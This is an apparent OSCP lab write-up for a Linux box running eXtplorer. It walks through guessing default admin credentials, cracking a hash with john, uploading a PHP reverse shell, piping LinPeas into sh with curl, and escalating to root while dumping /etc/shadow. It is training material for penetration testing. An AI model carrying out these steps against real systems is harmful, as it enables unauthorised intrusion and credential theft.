...
![OSCP - Extplorer - Linux - image1](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image1.png)
- Clicked "Let's go!" and setup Admin config
![OSCP - Extplorer - Linux - image2](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image2.png)
- Error message received
![OSCP - Extplorer - Linux - image3](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image3.png)
- Enumerated web directories with `gobuster` 
![OSCP - Extplorer - Linux - image4](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image4.png)
- Identified `filemanager` directory & navigated to `http:192.168.137.16/filemanager`
![OSCP - Extplorer - Linux - image5](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image5.png)
- Password guessed `admin:admin` credentials and logged into Admin panel
![OSCP - Extplorer - Linux - image6](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image6.png)
- Clicked "OK" and identified `dora` user from new pop-up
![OSCP - Extplorer - Linux - image7](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image7.png)
...
![OSCP - Extplorer - Linux - image8](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image8.png)
- Ran `john` against password hash for `dora` and found credential `dora:doraemon`
![OSCP - Extplorer - Linux - image9](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image9.png)
---
# Exploitation
## Name of the technique
- Identified option to upload files to Admin dashboard
![OSCP - Extplorer - Linux - image10](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image10.png)
- Created PHP reverse shell file with `revshells.com` and saved file as `shell2.php`
![OSCP - Extplorer - Linux - image11](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image11.png)
- Uploaded `shell2.php`, attempted to navigate to `192.168.137.16/filemanager/shell2.php` and caught reverse shell
![OSCP - Extplorer - Linux - image12](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image12.png)
---
# Lateral Movement to user
## Local Enumeration
- Upgraded to full shell, switched user with credentials `dora:doraemon`, then upgraded to full shell again
![OSCP - Extplorer - Linux - image13](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image13.png)
- Navigated to `/home/dora` and printed file `local.txt`
![OSCP - Extplorer - Linux - image14](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image14.png)
- Ran `cat /etc/passwd` to identify any other users & `cat /etc/shadow` to check access
![OSCP - Extplorer - Linux - image15](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image15.png)
---
# Privilege Escalation
## Local Enumeration
- Ran `sudo -l` to check sudo privileges for `dora`
![OSCP - Extplorer - Linux - image16](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image16.png)
- Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download and execute `LinPeas`
![OSCP - Extplorer - Linux - image17](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image17.png)
- Identified by `LinPeas` as vulnerable to [CVE-2021-3560](https://github.com/UNICORDev/exploit-CVE-2021-3560)
![OSCP - Extplorer - Linux - image18](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image18.png)
...
![OSCP - Extplorer - Linux - image19](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image19.png)
	- Also ran `- find /dev -group disk` to check partitions owned by `disk`
		![OSCP - Extplorer - Linux - image20](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image20.png)
- Identified ssh config file
![OSCP - Extplorer - Linux - image21](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image21.png)
- Identified interesting files modified in last 5 mins
![OSCP - Extplorer - Linux - image22](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image22.png)
...
![OSCP - Extplorer - Linux - image23](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image23.png)
...
![OSCP - Extplorer - Linux - image24](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image24.png)
...
![OSCP - Extplorer - Linux - image25](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image25.png)
- Navigated to `/root` and printed `/root/proof.txt`
![OSCP - Extplorer - Linux - image26](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image26.png)
- Ran `cat /etc/shadow` to print password hashes
![OSCP - Extplorer - Linux - image27](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image27.png)
...
![OSCP - Extplorer - Linux - image28](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image28.png)
- Ran `su root` to switch to `root` user with password `explorer`, and ran `ifconfig` to confirm IP address
![OSCP - Extplorer - Linux - image29](/files/OSCP%20-%20Extplorer%20-%20Linux%20-%20image29.png)
---
# Trophy & Loot
